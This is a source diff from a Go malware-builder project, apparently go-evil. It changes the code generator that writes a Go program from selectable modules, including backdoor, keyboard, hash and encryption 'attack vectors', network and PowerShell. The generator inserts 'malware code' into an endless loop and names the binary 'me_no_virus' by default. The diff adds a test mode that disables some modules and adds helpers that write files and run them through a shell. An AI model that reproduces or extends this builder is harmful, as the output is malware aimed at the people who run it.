@@ -14,14 +14,12 @@ import (
 
 	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
-var debug bool = false
+var debug bool = false // If this is true, then we will save the go-file that we compile
+var test_mode string   // Will make the for loop run once, independant if an exit statement exists
 var domains []string
-
-func Set_debug(new_debug bool) {
-	debug = new_debug
-}
 
 const (
 	sys            = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system/private\""
@@ -30,9 +28,9 @@ const (
 	keyboard       = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard/private\""
 	attack_hash    = "\tattack_hash \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private\""
 	attack_encrypt = "\tattack_encrypt \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/encrypt/private\""
-	backdoor       = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor/private\""
+	back           = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor/private\""
 	syscall        = "\"syscall\""
-	network        = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network/private\""
+	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network/private\""
 	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell/private\""
 
 	// Related to webview
@@ -45,53 +43,53 @@ const (
 func Append_domain(domain string) {
 	switch domain {
 	case "system":
-		if !find(sys) {
+		if !find(sys) && !mal.Is_disabled("sys") {
 			notify.Log("Adding domain 'system'", notify.Verbose_lvl, "2")
 			domains = append(domains, sys)
 		}
 	case "window":
-		if !find(win) {
+		if !find(win) && !mal.Is_disabled("win") {
 			notify.Log("Adding domain 'window'", notify.Verbose_lvl, "2")
 			domains = append(domains, win)
 		}
 	case "time":
-		if !find(time) {
+		if !find(time) && !mal.Is_disabled("time") {
 			notify.Log("Adding domain 'time'", notify.Verbose_lvl, "2")
 			domains = append(domains, time)
 		}
 
 	case "keyboard":
-		if !find(keyboard) {
+		if !find(keyboard) && !mal.Is_disabled("keyboard") {
 			notify.Log("Adding domain 'keyboard'", notify.Verbose_lvl, "2")
 			domains = append(domains, keyboard)
 		}
 	case "attack_hash":
-		if !find(attack_hash) {
+		if !find(attack_hash) && !mal.Is_disabled("attack_hash") {
 			notify.Log("Adding domain 'attack_hash'", notify.Verbose_lvl, "2")
 			domains = append(domains, attack_hash)
 		}
 	case "attack_encrypt":
-		if !find(attack_encrypt) {
+		if !find(attack_encrypt) && !mal.Is_disabled("attack_encrypt") {
 			notify.Log("Adding domain 'attack_encrypt'", notify.Verbose_lvl, "2")
 			domains = append(domains, attack_encrypt)
 		}
 	case "backdoor":
-		if !find(backdoor) {
+		if !find(back) && !mal.Is_disabled("backdoor") {
 			notify.Log("Adding domain 'backdoor'", notify.Verbose_lvl, "2")
-			domains = append(domains, backdoor)
+			domains = append(domains, back)
 		}
 	case "syscall":
-		if !find(syscall) {
+		if !find(syscall) && !mal.Is_disabled("syscall") {
 			notify.Log("Adding library 'syscall'", notify.Verbose_lvl, "2")
 			domains = append(domains, syscall)
 		}
 	case "network":
-		if !find(network) {
+		if !find(net) && !mal.Is_disabled("net") {
 			notify.Log("Adding library 'network'", notify.Verbose_lvl, "2")
-			domains = append(domains, network)
+			domains = append(domains, net)
 		}
 	case "powershell":
-		if !find(pwsh) {
+		if !find(pwsh) && !mal.Is_disabled("pwsh") {
 			notify.Log("Adding library 'powershell'", notify.Verbose_lvl, "2")
 			domains = append(domains, pwsh)
 		}
@@ -108,6 +106,21 @@ func Set_target_ARCH(new_arch string) {
 	os.Setenv("GOARCH", new_arch)
 }
 
+func Set_debug(new_debug bool) {
+	debug = new_debug
+}
+
+func Set_testMode(new_mode bool) {
+	if new_mode {
+		test_mode = "i := 0; i < 1; i++"
+		mal.Disable_domain("win")      // Window domain
+		mal.Disable_domain("time")     // Time management domain
+		mal.Disable_domain("sys")      // System domain
+		mal.Disable_domain("back")     // Backdoor
+		mal.Disable_domain("keyboard") // Keyboard
+	}
+}
+
 func find(domain string) bool {
 	for _, line := range domains {
 		if domain == line {
@@ -122,11 +135,11 @@ func Write_file() {
 		"package main",
 		"import (",
 	}
-	base_code = append(base_code, domains...)          // Which domains to include
-	base_code = append(base_code, ")", "func main(){") // Main function and closing include tag
-	base_code = append(base_code, "for {")             // While loop
-	base_code = append(base_code, mal.GetContent()...) // Insert the malware code
-	base_code = append(base_code, "}}")                // And insert the end
+	base_code = append(base_code, domains...)            // Which domains to include
+	base_code = append(base_code, ")", "func main(){")   // Main function and closing include tag
+	base_code = append(base_code, "for "+test_mode+" {") // While loop
+	base_code = append(base_code, mal.GetContent()...)   // Insert the malware code
+	base_code = append(base_code, "}}")                  // And insert the end
 
 	if mal.GetName() == "" {
 		mal.SetBinaryName("me_no_virus")
@@ -243,4 +256,25 @@ func create_WebView2Loader() {
 	if err != nil {
 		notify.Error(err.Error(), "io.create_WebView2Loader()")
 	}
+}
+
+func Create_file(file_name string, gut []string) {
+	file, err := os.Create(file_name)
+	if err != nil {
+		notify.Error(err.Error(), "io.Create_file()")
+	}
+	write := bufio.NewWriter(file)
+	for _, line := range gut {
+		write.WriteString(line + "\n")
+	}
+	write.Flush()
+}
+
+func Run_file(file_path string) string {
+	resp := subprocess.RunShell("", "", file_path)
+
+	return resp.StdOut
+}
+func Remove_file(file_path string) {
+	os.Remove(file_path)
 }
